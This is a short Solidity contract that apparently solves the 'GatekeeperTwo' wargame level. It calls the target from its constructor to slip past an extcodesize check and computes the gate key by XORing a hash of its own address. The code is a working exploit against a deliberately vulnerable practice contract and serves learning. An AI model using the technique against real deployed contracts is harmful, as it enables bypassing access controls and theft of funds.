pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";

//research here https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/
//and here https://en.wikipedia.org/wiki/Bitwise_operation
contract Attacker {
    GatekeeperTwo gatekeeper;

    constructor(address _gatekeeperAddress) {
        gatekeeper = GatekeeperTwo(_gatekeeperAddress);
        attack();
    }

    function attack() internal {
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gatekeeper.enter(_key);
    }
}
